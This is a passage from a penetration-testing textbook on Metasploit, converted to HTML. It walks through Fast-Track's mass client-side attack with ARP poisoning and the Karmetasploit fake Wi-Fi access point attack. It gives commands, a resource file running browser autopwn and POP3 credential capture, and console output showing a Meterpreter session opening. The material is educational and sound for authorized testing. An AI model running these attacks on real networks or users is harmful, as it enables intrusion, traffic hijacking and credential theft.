specific vulnerability within one of these libraries, the attacker will obtain full access to the target machine.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_473.png"/></span></p><p class="s30" style="padding-left: 17pt;text-indent: 0pt;text-align: center;">O  <span class="s25">Enter the number: </span><span class="s24">4</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 17pt;text-indent: 0pt;text-align: center;">. . . SNIP  . .  .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">8 <span class="s25">Enter the IP Address you want the web server to listen on: </span><span class="s24">10.211.55.130</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Specify your payload:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l38"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Windows Meterpreter Reverse Meterpreter</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Generic Bind Shell</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Windows VNC Inject Reverse_TCP (aka &quot;Da Gui&quot;)</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Reverse TCP Shell</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-top: 2pt;padding-bottom: 1pt;padding-left: 78pt;text-indent: 0pt;text-align: left;">@ <span class="s25">Enter the number of the payload you want: </span><span class="s24">1</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_474.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">After selecting option 4, <span class="s25">Mass Client-Side Attack </span><span class="s32">O</span>, from the main menu, tell Fast-Track what IP address the web server should listen on <span class="s32">8</span>, and then choose a payload <span class="s32">@</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Next, decide whether to use Ettercap to ARP-poison your target machine.</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 73%;text-align: left;">Ettercap will intercept all requests that the target makes and redirect them to your malicious server. After confirming that you want to use Ettercap at <span class="s32">O</span>, enter the IP address of the target you want to poison <span class="s32">8</span>. Fast-Track will then go ahead and set up Ettercap <span class="s32">@ </span>for you.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_475.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">O <span class="s25">Would you like to use Ettercap to ARP poison a host yes or no: </span><span class="s24">yes</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">8 <span class="s25">What IP Address do you want to poison: </span><span class="s24">10.211.55.128</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Setting up the ettercap filters....</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Filter created...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Compiling Ettercap filter...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-top: 2pt;padding-bottom: 1pt;padding-left: 78pt;text-indent: 0pt;text-align: left;">@ <span class="s25">Filter compiled...Running Ettercap and poisoning target...</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_476.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 83%;text-align: justify;">Once a client connects to your malicious server, Metasploit fires exploits <span class="s32">O </span>at the target. In the following listing, you can see that the Adobe exploit is successful, and a Meterpreter shell is waiting <span class="s32">8</span>.</p><p class="s22" style="padding-top: 4pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">You could use ARP cache poisoning within this attack, but it will only work when you are on the same local and unrestricted subnet as the target.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_477.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Local IP: http://10.211.55.130:8071/ [*] Server started.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Handler binding to LHOST 0.0.0.0 [*] Started reverse handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Exploit running as background job. [*] Using URL: http://0.0.0.0:8072/</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Local IP: http://10.211.55.130:8072/ [*] Server started.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(zenturiprogramchecker_unsafe) &gt; [*] Handler binding to LHOST 0.0.0.0</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Started reverse handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Using URL: http://0.0.0.0:8073/</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Local IP: http://10.211.55.130:8073/ [*] Server started.</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[*] Sending Adobe Collab.getIcon() Buffer Overflow to 10.211.55.128:1044... [*] Attempting to exploit ani_loadimage_chunksize</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Sending HTML page to 10.211.55.128:1047...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Sending Adobe JBIG2Decode Memory Corruption Exploit to 10.211.55.128:1046... [*] Sending exploit to 10.211.55.128:1049...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Attempting to exploit ani_loadimage_chunksize</p><p class="s25" style="padding-left: 110pt;text-indent: -20pt;line-height: 88%;text-align: left;">[*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to 10.211.55.128:1076...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Transmitting intermediate stager for over-sized stage...(216 bytes) [*] Sending stage (718336 bytes)</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">8 <span class="s25">[*] Meterpreter session 1 opened (10.211.55.130:9007 -&gt; 10.211.55.128:1077 msf exploit(zenturiprogramchecker_unsafe) &gt; sessions -l</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Active sessions</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">===============</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Id Description Tunnel</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s36" style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_478.png"/></span> <span><img width="60" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_479.png"/></span> <span><img width="33" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_480.png"/></span></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">1 Meterpreter 10.211.55.130:9007 -&gt; 10.211.55.128:1077</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(zenturiprogramchecker_unsafe) &gt; sessions -i 1 [*] Starting interaction with 1...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_481.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark333">A Few Words About Automation</a><a name="bookmark344">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Fast-Track offers a plethora of exploitation capabilities that expand upon the feature-rich Metasploit Framework. When coupled with Metasploit it will allow you to use advanced attack vectors to fully control a target machine. Of course, automated attack vectors do not always succeed, which is why you must understand the system you are performing the attack against and ensure that when you attack it, you know its chances of success. If an auto- mated tool fails, your ability to perform the tests manually and successfully attack the target system will make you a better penetration tester.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="132" height="123" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_482.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 171pt;text-indent: 0pt;text-align: left;"><a name="bookmark345">KARMETASPLOIT </a><a name="bookmark351">&zwnj;</a><a name="bookmark352">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Karmetasploit is Metasploit’s implementation of KARMA, a set of wireless security tools developed</p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">by Dino Dai Zovi and Shane Macaulay. KARMA takes advantage of a vulnerability inherent in the way Win- dows XP and Mac OS X operating systems search for networks: When each system boots, it sends bea- cons looking for networks to which it has connected previously.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://trailofbits.com/karma/" class="s31" target="_blank">An attacker using KARMA sets up a fake access point on his computer and then listens for and responds to these beacons from the target, pretending to be whatever wireless network the client is looking for. Because most client computers are configured to connect automatically to wireless networks they have already used, KARMA can be used to gain complete control of a client’s network traffic, thus allowing an attacker to launch client-side attacks, capture passwords, and so forth. With the prevalence of poorly secured corporate wireless networks, an attacker using KARMA can sit in a nearby parking lot, adjacent office, or similar, and gain access to a target’s network with little effort. You can read more about the original implementation of KARMA at </a><a href="http://trailofbits.com/karma/" class="s20" target="_blank">http://trailofbits.com/karma/</a><a href="http://trailofbits.com/karma/" class="s31" target="_blank">.</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Karmetasploit is the Metasploit Framework implementation of the KARMA attack. It implements various “evil” services including DNS, POP3, IMAP4, SMTP, FTP, SMB, and HTTP. These services accept and respond to most requests from clients and will serve up all kinds of malicious fun. (The various modules are in the <span class="s19">modules/auxiliary/server </span>directory of the Metasploit root directory.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark346">Configuration</a><a name="bookmark353">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Karmetasploit requires very little configuration. To begin, we configure a DHCP server to be used to hand out IP addresses to wireless targets. Back| Track includes a DHCP server, but we will need to create a custom configura- tion file for it to use with Karmetasploit, as shown in the following listing:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_483.png"/></span></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">option domain-name-servers 10.0.0.1; default-lease-time 60;</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">max-lease-time 72;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">ddns-update-style none; authoritative;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">log-facility local7;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">subnet 10.0.0.0 netmask 255.255.255.0 {</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8 <span class="s25">range 10.0.0.100 10.0.0.254;</span></p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 9pt;text-align: left;">option routers 10.0.0.1;</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 11pt;text-align: left;">option domain-name-servers 10.0.0.1;</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">}</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_484.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">We back up our original <span class="s19">dhcpd.conf </span>file by entering <span class="s24">cp /etc/dhcp3/dhcpd.conf/ etc/dhcp3/dhcpd.conf.back</span>, and then we create a new file containing the data shown at <span class="s32">O</span>, which will serve addresses in the range of 10.0.0.100 to 10.0.0.254 <span class="s32">8</span>.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(If you are unfamiliar with DHCP configurations, don’t worry; as long as your</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">new <span class="s19">dhcpd.conf </span>looks similar to this it should work fine.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we download the KARMA resource file, because as of this writing it’s not included in the regular Metasploit trunk:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_485.png"/></span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">root@bt:/opt/metasploit3/msf3# <a href="http://www.offensive-security.com/downloads/karma.rc" class="s40" target="_blank">wget http://www.offensive-security.com/downloads/karma.rc</a></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_486.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When we open the KARMA resource file <span class="s19">karma.rc</span>, we can see the sequence of events that occur when it runs, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_487.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/metasploit3/msf3# <span class="s24">cat karma.rc</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_connect postgres:toor@127.0.0.1/msfbook</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">use auxiliary/server/browser_autopwn</span></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">8 <span class="s25">setg AUTOPWN_HOST 10.0.0.1 setg AUTOPWN_PORT 55550</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">setg AUTOPWN_URI /ads</p><p class="s30" style="padding-top: 1pt;padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">@ <span class="s25">set LHOST 10.0.0.1 set LPORT 45000</span></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">set SRVPORT 55550</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set URIPATH /ads run</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">use auxiliary/server/capture/pop3 set SRVPORT 110</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">set SSL false run</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_488.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: justify;">After loading the database (<span class="s25">db_connect postgres:toor@127.0.0.1/msfbook</span>) in which to store its results, KARMA loads the <span class="s25">browser_autopwn </span>server as shown at <span class="s32">O</span>. This is a handy way to attempt a number of exploits against a browser</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: justify;">in an untargeted manner. A handful of the browser-based exploits in the</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Framework contain the directive <span class="s25">include Msf::Exploit::Remote::BrowserAutopwn</span>: Exploits that contain that include line will be attempted when the autopwn server is accessed.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">At <span class="s32">8 </span>and <span class="s32">@</span>, the local IP address is set to <span class="s25">10.0.0.1</span>, which coincides with the default DHCP configuration. Then, in lines <span class="s32">O </span>and on, the various servers are configured and started. (To get a complete picture of what occurs in this</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">attack, read the resource file.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we place our wireless card in monitor mode. The way in which we do this depends on our wireless card’s chipset. The wireless card in the fol- lowing example uses the RT73 chipset. We use <span class="s25">airmon-ng start wlan0 </span>to place it in monitor mode:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_489.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/opt/metasploit3/msf3# <span class="s24">airmon-ng start wlan0</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_490.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s22" style="padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <a href="http://www.aircrack-ng.org/)" class="s20" target="_blank">If your card uses a different chipset from the one used in this example, visit the Aircrack-ng website </a><a href="http://www.aircrack-ng.org/)" class="s31" target="_blank">(http://www</a><span class="p">.aircrack-ng.org/) </span><span class="s19">for specifics on how to place your card in monitor mode.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark347">Launching the Attack</a><a name="bookmark354">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s25">airbase-ng </span>component of the Aircrack-ng suite is used to create Karmeta- sploit’s fake access point. In the next example, we configure the <span class="s25">airbase-ng </span>access point to respond to all probes (<span class="s25">-P</span>), to beacon every 30 seconds (<span class="s25">-C 30</span>) with the ESSID Free Wi-Fi (<span class="s25">-e &quot;Free WiFi&quot;</span>), and to be verbose (<span class="s25">-v</span>) using the interface <span class="s25">mon0</span>:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_491.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">root@bt:/opt/metasploit3/msf3# <span class="s24">airbase-ng  -P  -C  30  -e  &quot;Free  WiFi&quot;  -v  mon0</span></p><p class="s25" style="padding-left: 90pt;text-indent: -12pt;line-height: 88%;text-align: left;"><span class="s30">O </span>14:06:57 Created tap interface <span class="s24">at0 </span>14:06:57 Trying to set MTU on at0 to 1500 14:06:57 Trying to set MTU on mon0 to 1800</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">14:06:57 Access Point with BSSID 00:21:29:E2:DE:14 started.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_492.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">As you can see at <span class="s32">O</span>, Airbase-ng creates a new interface called <span class="s19">at0</span>. Kar- metasploit will use this interface.</p><p style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Next, we turn on the <span class="s19">at0 </span>interface and start the DHCP server:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_493.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">O <span class="s25">root@bt:/opt/metasploit3/msf3# </span><span class="s24">ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 13pt;text-align: left;">8 <span class="s25">root@bt:/opt/metasploit3/msf3# </span><span class="s24">dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">Wrote 0 leases to leases file.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">Listening on LPF/at0/00:21:29:e2:de:14/10.0.0/24 Sending on LPF/at0/00:21:29:e2:de:14/10.0.0/24 Sending on Socket/fallback/fallback-net</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">Can&#39;t create PID file /var/run/dhcpd.pid: Permission denied.</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: justify;">@ <span class="s25">root@bt:/opt/metasploit3/msf3# </span><span class="s24">ps aux |grep dhcpd</span></p><p class="s25" style="padding-left: 55pt;text-indent: -18pt;line-height: 87%;text-align: justify;">dhcpd 4015 0.0 0.2 3812 1840 ? Ss 14:09 0:00 dhcpd3 -cf /etc/dhcp3/ dhcpd.conf at0</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">root 4017 0.0 0.0 2012 564 pts/4 S+ 14:09 0:00 grep dhcpd</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: justify;">O <span class="s25">root@bt:/opt/metasploit3/msf3# tail </span><span class="s24">tail -f /var/log/messages</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Apr 2 14:06:57 bt kernel: device mon0 entered promiscuous mode</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Apr 2 14:09:30 bt dhcpd: Internet Systems Consortium DHCP Server V3.1.1</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Apr 2 14:09:30 bt kernel: warning: `dhcpd3&#39; uses 32-bit capabilities (legacy support in use) Apr 2 14:09:30 bt dhcpd: Copyright 2004-2008 Internet Systems Consortium.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Apr 2 14:09:30 bt dhcpd: All rights reserved.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a href="http://www.isc.org/sw/dhcp/" class="s34" target="_blank">Apr 2 14:09:30 bt dhcpd: For info, please visit </a>http://www.isc.org/sw/dhcp/ Apr 2 14:09:30 bt dhcpd: Wrote 0 leases to leases file.</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Apr 2 14:09:30 bt dhcpd: Listening on LPF/at0/00:21:29:e2:de:14/10.0.0/24 Apr 2 14:09:30 bt dhcpd: Sending on LPF/at0/00:21:29:e2:de:14/10.0.0/24</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_494.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 77%;text-align: justify;">The <span class="s19">at0 </span>interface is turned on using the IP address of <span class="s25">10.0.0.1 </span>shown at <span class="s32">O</span>, and the DHCP server is started using the configuration file we created earlier, also using <span class="s19">at0 </span>as shown at <span class="s32">8</span>. To make sure that the DHCP server is running, we run a quick <span class="s25">ps aux </span>at <span class="s32">@</span>. Finally, we tail the <span class="s19">messages </span>log file at <span class="s32">O </span>to see when</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">IP addresses are being handed out.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that the entire Karmetasploit configuration is complete, we can load the resource file from within <span class="s19">msfconsole </span>using <span class="s25">resource karma.rc </span>as shown next. (Note that we can also pass the resource file to <span class="s19">msfconsole </span>via the com- mand line by entering <span class="s25">msfconsole -r karma.rc</span>.) Let’s see it in action:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_495.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">resource karma.rc</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">resource (karma.rc)&gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msfbook </span>resource (karma.rc)&gt; <span class="s24">use auxiliary/server/browser_autopwn </span>resource (karma.rc)&gt; <span class="s24">setg AUTOPWN_HOST 10.0.0.1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">AUTOPWN_HOST =&gt; 10.0.0.1</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">resource (karma.rc)&gt; <span class="s24">setg AUTOPWN_PORT 55550</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">AUTOPWN_PORT =&gt; 55550</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">resource (karma.rc)&gt; <span class="s24">setg AUTOPWN_URI /ads</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">AUTOPWN_URI =&gt; /ads</p><p class="s30" style="padding-left: 42pt;text-indent: 0pt;line-height: 12pt;text-align: center;">O  <span class="s25">resource (karma.rc)&gt; </span><span class="s24">set  LHOST 10.0.0.1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">LHOST =&gt; 10.0.0.1</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">resource (karma.rc)&gt; <span class="s24">set  LPORT  45000</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LPORT =&gt; 45000</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">resource (karma.rc)&gt; <span class="s24">set SRVPORT 55550</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SRVPORT =&gt; 55550</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">resource (karma.rc)&gt; <span class="s24">set  URIPATH /ads</span></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">URIPATH =&gt; /ads</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">resource (karma.rc)&gt; <span class="s24">run</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Auxiliary module execution completed</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">8 <span 